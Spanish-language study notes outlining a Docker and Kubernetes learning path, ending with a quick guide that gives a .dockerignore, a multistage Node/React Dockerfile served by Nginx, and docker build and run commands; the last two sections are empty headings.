Crear entornos de desarrollo y producción multifase y multi-servicio.

Docker Compose, Redes, Volúmenes, Builds eficientes


Entornos de Múltiples Servicios:
Orquestar múltiples contenedores que interactúan (ej. una app web y una base de datos) usando Docker Compose

1. Archivo docker-compose.yml:
Estructura YAML (versión, services, networks, volumes).

2. Comandos principales:
docker compose up
docker compose down
docker compose ps
docker compose logs

3. Creación de un Stack:
Contenerizar una aplicación con una db

 
Almacenamiento y Networking:

1. Volúmenes (Volumes):
Cómo la información persiste fuera del contenedor (para datos de bases de datos).
Crear y usar Volúmenes Nombrados.
Usar Bind Mounts (para desarrollo local, mapeando código).

2. Redes (Networking):
Red predeterminada (Bridge) de Compose.
Redes Definidas por el Usuario para un mejor aislamiento.
Descubrimiento de Servicios: Los contenedores en la misma red se encuentran por nombre de servicio.


Optimización de Builds:

1. Multistage Builds (Construcciones Multifase):
Usar múltiples sentencias FROM en un solo Dockerfile
Para separar el entorno de build (compilación) del entorno final de runtime (ejecución)
Resultando en imágenes mucho más pequeñas y seguras.

2. dockerignore: Excluir archivos innecesarios para acelerar el build.

3. Caching: cómo Docker almacena en caché las capas para hacer builds incrementales rápidos.



## 3. Avanzado

Llevar los contenedores a entornos de producción, manejar clusters y automatizar el despliegue.

Despliegue en entornos de alta disponibilidad y orquestación

Swarm, Kubernetes (Conceptos), CI/CD, Seguridad.


Orquestación y Escalabilidad:

1. Docker Swarm:
Inicialización del Swarm: docker swarm init.
Creación de Servicios (Services) y escalado: docker service create, docker service scale.
Conceptos de Nodos (Managers y Workers).

2. Introducción a Kubernetes (K8s): 
Necesidad de una orquestación más robusta.
Conceptos clave: Pods, Deployments, Services, Namespaces
K8s es el siguiente paso natural en la orquestación


CI/CD y Automatización:

1. Integrar Docker en un flujo de Integración Continua / Despliegue Continuo (CI/CD).
GitHub Actions / GitLab CI / Jenkins: Configurar pipelines que construyan la imagen, la prueben y la suban al registro de contenedores (Docker Hub, AWS ECR, GCR).


Seguridad y Monitoreo:

1. Prácticas de Seguridad (Security Best Practices):
No correr contenedores como root.
Usar imágenes base minimalistas (ej. Alpine o Distroless).
Manejo de secretos (Secrets) en Docker Swarm o Kubernetes.

2. Monitoreo y Logging: Configurar herramientas para ver métricas y logs de los contenedores en producción (ej. Prometheus y Grafana).


## Doc y Práctica

1. Documentación Oficial de Docker

2. Contenerizar una app que ya tengas.
Crear una stack de Compose con tres servicios (Frontend, Backend, DB).
Implementar un Multistage Build para reducir el tamaño de la imagen
Implementar un Multistage Build para reducir el tamaño de la imagen.




# Kubernetes

Gestionar aplicaciones en entornos de producción a gran escala

Es el estándar de la industria para la orquestación de contenedores.


## 1. Fundamentos

Arquitectura y los objetos fundamentales de K8s.

Clúster, Control Plane, Nodos, Pods, YAML.


Arquitectura y Fundamentos:
Estructura de un clúster de K8s y el objeto más pequeño y fundamental: el Pod.

Conceptos:

1. Kubernetes:
su rol como orquestador y su diferencia con Docker Swarm.

2. Arquitectura del Clúster:
Control Plane (Plano de Control): Componentes clave (API Server, etcd, Scheduler, Controller Manager).
Worker Nodes (Nodos Trabajadores): Componentes clave (Kubelet, Kube-proxy, Container Runtime como Docker o containerd).

3. Instalación Local: Configurar un clúster local para práctica (Minikube o Kind).


Comandos y Objetos Clave:

1. kubectl: Dominar la herramienta de línea de comandos
básicos: kubectl apply, kubectl get, kubectl describe, kubectl delete.

2. Pods: El objeto más pequeño
Definición en YAML: Comprender la estructura de apiVersion, kind, metadata y spec.
Creación de Pods simples y multi-container (Patrón Sidecar).



## 2. Despliegue y Gestión

Despliegue y gestión del tráfico de aplicaciones
 
Deployments, Services, Ingress, ConfigMaps, Secrets

Desplegar aplicaciones de manera reproducible y hacer que sean accesibles (interna y externamente).


Despliegues y ReplicaSets:

1. ReplicaSets: Entender cómo se asegura el número deseado de copias de un Pod.

2. Deployments: El objeto que gestiona la actualización y el rollback de las aplicaciones de forma declarativa.
Estrategias de actualización: Rolling Update y Recreate.

3. Namespaces: Usar Namespaces para organizar y aislar recursos dentro del clúster (ej. dev, staging, production).


Descubrimiento de Servicios (Services):

1. Services: Abstracción esencial para el descubrimiento de servicios y el balanceo de carga interno.

2. Tipos de Services:
ClusterIP: Solo accesible dentro del clúster (por defecto).
NodePort: Expone el servicio en un puerto de cada Nodo (útil para pruebas).
LoadBalancer: Proporciona un Load Balancer externo del proveedor de la nube (AWS, GCP, Azure).


Configuración y Tráfico Externo:

1. ConfigMaps y Secrets: Separar la configuración (variables de entorno, archivos de configuración) y la información sensible (contraseñas, tokens) del código del Pod.

2. Ingress: Gestionar el acceso externo a los servicios del clúster, ofreciendo routing basado en host o path, y terminación SSL.
Necesidad de un Ingress Controller (ej. NGINX Ingress Controller). 



## 3. Avanzado

Almacenamiento, configuración avanzada y persistencia

Volumes, StatefulSets, RBAC, Affinity, Helm.

Gestionar aplicaciones con estado, manejar configuraciones complejas y empaquetar aplicaciones para su distribución.


Almacenamiento Persistente:

1. Volumes: Los mecanismos de almacenamiento de K8s.

2. PV (PersistentVolume): Recurso de almacenamiento en el clúster.

3. PVC (PersistentVolumeClaim): Solicitud de almacenamiento por parte de un Pod.

4. StorageClass: Configuración para el aprovisionamiento dinámico de almacenamiento.


Aplicaciones con Estado:

1. StatefulSets: Para gestionar aplicaciones que requieren identidad única y almacenamiento persistente estable (ej. bases de datos, brokers de mensajes).
Diferencia clave con los Deployments


Gestión Declarativa Avanzada:

1. DaemonSets: Garantizar que un Pod se ejecute en todos o en un subconjunto específico de Nodos
(ej. agentes de monitoreo, log collectors).

2. Jobs y CronJobs: Para ejecutar tareas que terminan (Jobs) o tareas programadas (CronJobs).

3. Helm: El gestor de paquetes de facto para K8s.
instalar aplicaciones con Charts de Helm.
propio Chart para empaquetar tu aplicación.



## 4. Pro: Operaciones y Observabilidad

Administración de Clústeres y Observabilidad.

Kubeadm, Logging/Monitoring, Seguridad, Redes CNI.

Cómo se mantiene, se protege y se escala un clúster en un entorno de producción real.


Administración del Clúster:

1. Herramientas de Provisionamiento: Entender cómo provisionar un clúster desde cero (ej. kubeadm).

2. CKS (Cloud Kubernetes Service): Conocer las diferencias y vendor lock-in de los principales servicios en la nube (EKS en AWS, GKE en GCP, AKS en Azure). 

3. Etiquetado y Selectores: Uso avanzado de etiquetas para programación de Pods
(Node Selectors, Node Affinity, Taints y Tolerations).


Seguridad y Acceso:

1. RBAC (Role-Based Access Control):
Definir quién (Usuario o Servicio)
puede hacer qué (Ver, Crear, Eliminar)
en qué recursos del clúster (Role, ClusterRole, RoleBinding, ClusterRoleBinding).

2. NetworkPolicy: Definir reglas de Firewall a nivel de Pod (quién puede comunicarse con quién).


Observabilidad:

1. Logging: Centralizar los logs de los Pods (Patrón de la pila ELK/EFK).

2. Monitoring: Recolección de métricas (Prometheus, Kube-state-metrics).

3. Visualización: Crear dashboards con herramientas como Grafana.



# Docker

## 1. Guía rapida contenerizar una app

Crear una Imagen Docker a partir de tu código
El proceso se centra en crear el archivo Dockerfile y luego construir la imagen.

1. Crear el Archivo .dockerignore
Antes de empezar, crea un archivo llamado .dockerignore en la raíz de tu proyecto.
Este archivo es crucial para acelerar la construcción y mantener la imagen pequeña
Le dice a Docker qué archivos y carpetas no debe copiar al contexto de la construcción.

Contenido Típico de .dockerignore:

```
# Directorios de dependencias
node_modules

# Archivos de build y cache
dist
build
.git
.gitignore
.DS_Store
npm-debug.log*
yarn-error.log*
```


2. Crear el Dockerfile
El Dockerfile contiene las instrucciones para construir la imagen. Utilizaremos el patrón de Construcción Multifase (Multi-Stage Build)
Es la mejor práctica para aplicaciones Frontend/Backend, ya que separa el entorno de compilación (grande) del entorno de ejecución (pequeño y seguro).

Ej Dockerfile: para Node/React

```
# ----------------------------------------------------------------------
# FASE 1: BUILDER (Compilación de la app)
# Esta fase usa una imagen grande para instalar dependencias y compilar.
# ----------------------------------------------------------------------
FROM node:20-slim AS builder

# 1. Directorio de trabajo: Todos los comandos se ejecutan aquí.
WORKDIR /app

# 2. Copia los archivos de configuración de dependencias primero.
# Esto optimiza el caching de Docker: si estos archivos no cambian,
# no se reinstalan las dependencias.
COPY package.json package-lock.json ./

# 3. Instala todas las dependencias (incluyendo devDependencies).
RUN npm install

# 4. Copia el resto del código fuente.
COPY . .

# 5. Compila la aplicación (ej. React/Vite/Next.js/etc.).
# El resultado final (dist, build, etc.) estará listo.
RUN npm run build


# ----------------------------------------------------------------------
# FASE 2: RUNTIME (Ejecución y Despliegue)
# Esta fase usa una imagen minúscula y solo copia los archivos compilados
# de la fase anterior. ¡Esto reduce drásticamente el tamaño final!
# ----------------------------------------------------------------------
FROM nginx:alpine AS runner

# 1. Copia los archivos compilados (de la FASE 1) a la carpeta de Nginx.
# Cambia /app/dist por la ruta de salida de tu build (ej: /app/build).
COPY --from=builder /app/dist /usr/share/nginx/html

# 2. Expone el puerto por defecto de Nginx.
EXPOSE 80

# 3. Comando de inicio: Nginx iniciará el servidor web.
CMD ["nginx", "-g", "daemon off;"]
```


3. Construir la Imagen Docker

Una vez que tienes tu Dockerfile en la raíz del proyecto, usa el siguiente comando para construir la imagen.

Abre tu terminal en el directorio raíz donde se encuentra el Dockerfile.

Ejecuta el comando de construcción:

```
docker build -t mi-app-react:1.0 .
```

docker build: El comando para construir.
-t mi-app-react:1.0: La etiqueta (tag) que le das a tu imagen. Úsalo como nombre-de-tu-app:version.
.: Indica que el contexto de construcción es el directorio actual.


4. Ejecutar el Contenedor (Prueba)

prueba que tu imagen funciona correctamente ejecutándola localmente:

```
docker run -p 8080:80 -d mi-app-react:1.0
```
-p 8080:80: Mapea el puerto 80 del contenedor (expuesto por Nginx) al puerto 8080 de tu máquina local.
-d: Ejecuta el contenedor en modo detached (en segundo plano).

Ahora deberías poder acceder a tu aplicación en tu navegador visitando http://localhost:8080.





## 2. Crear una stack de Compose


## 3. Implementar un Multistage Build 



